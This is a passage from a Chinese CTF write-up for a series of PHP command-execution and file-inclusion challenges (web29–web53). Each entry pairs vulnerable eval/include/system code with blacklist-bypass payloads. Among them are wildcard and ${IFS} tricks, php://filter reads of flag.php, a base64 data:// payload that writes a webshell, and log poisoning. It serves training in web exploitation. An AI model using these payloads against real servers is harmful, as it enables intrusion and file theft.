class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;cat ????.php&#96;?&gt;</span><br></pre></td></tr></table></figure><h3 id="web30">web30</h3><p>考点：通配符绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;cat ????.???&#96;?&gt;</span><br></pre></td></tr></table></figure><h3 id="web31">web31</h3><p>考点：空格、通配符绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><p><code>&lt;?=</code>等价于 <code>&lt;?php echo</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;more%09fla??ph?&#96;?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>有一个奇怪的地方就是这里过滤我试了常见的绕过之后只能用%09</p></blockquote><h3 id="web32">web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个过滤确实是把👴给🤮到了，过滤了反引号不能直接执行命令，过滤了<code>(</code>不能直接使用函数，一直想另外引用一个GET参数，但是没能成功。</p><p>这道题的关键地方在于，PHP中不用括号的函数有<code>echo</code>和<code>include</code>和<code>require</code>，既然过滤了<code>echo</code>，那么就用其他两个。</p><p>此外过滤了<code>;</code>可以用<code>?&gt;</code>代替。</p><p>默认是没有回显的，可以使用PHP伪协议。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;require&quot;$_POST[1]&quot;?&gt;</span><br><span class="line"></span><br><span class="line">POST: 1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web33">web33</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里涉及到一个PHP特性，<code>echo</code>和<code>include</code>和<code>require</code>这三个函数直接后面跟<code>$</code>不会影响PHP语法。</p><p>所以直接把上面一道题的双引号去掉即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;require$_POST[1]?&gt;</span><br><span class="line"></span><br><span class="line">POST: 1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web34">web34</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>沿用上一个payload</p><h3 id="web35">web35</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续用上一个payload</p><h3 id="web36">web36</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把上面的payload稍加改造继续用。</p><h3 id="web37">web37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于禁用了flag关键字不能使用php://协议，但是在<code>allow_url_include=On、allow_url_fopen()=On</code>的条件下，可以使用data://协议写webshell。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgZWNobyBmaWxlX3B1dF9jb250ZW50cygidGVzdC5waHAiLGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYkoyTmpKMTBwUHo0PSIpKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h3 id="web38">web38</h3><p>沿用上一题的payload。</p><p>另外还可以包含日志，在UA中写入一句话，然后直接包含日志文件<code>/var/log/nginx/access.log</code></p><h3 id="web39">web39</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain,<span class="meta">&lt;?php</span> <span class="keyword">echo</span> file_put_contents(<span class="string">&quot;test.php&quot;</span>,<span class="string">&quot;&lt;?php system(&#x27;cat f*&#x27;);&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="web40">web40</h3><p>考点：无参数函数绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤之后还剩所有的字母和<code>!();_|</code>字符，既然括号还在那么就可以使用函数，用无参数函数解决。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>yu22x师傅提到还可以在特定PHP版本 <strong>5.4&lt;php&lt;7.2</strong> 的情况下使用session_id()绕过。</p><p>目标站点用的PHP7.2+，限制了PHPSESSID的合法字符。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201019101214.png" alt=""></p><h3 id="web41">web41</h3><h3 id="web42">web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span>($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;cat flag.php;</span><br></pre></td></tr></table></figure><h3 id="web43">web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;sort flag.php||</span><br></pre></td></tr></table></figure><h3 id="web44">web44</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;sort%20fla?.php||</span><br></pre></td></tr></table></figure><h3 id="web45">web45</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;sort%09fla?.php||</span><br></pre></td></tr></table></figure><h3 id="web46">web46</h3><p>沿用上一题的payload。</p><h3 id="web47">web47</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;nl%09fla?.php||</span><br></pre></td></tr></table></figure><h3 id="web48">web48</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>沿用上一题的payload。</p><h3 id="web49">web49</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>沿用上一题的payload。</p><blockquote><p>话说为什么%还是可以用。</p></blockquote><h3 id="web50">web50</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;nl&lt;fl&quot;&quot;ag.php||</span><br></pre></td></tr></table></figure><h3 id="web51">web51</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>沿用上一个payload。</p><h3 id="web52">web52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;nl$&#123;IFS&#125;&#x2F;fl&#39;&#39;ag||</span><br></pre></td></tr></table></figure><h3 id="web53">web53</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span 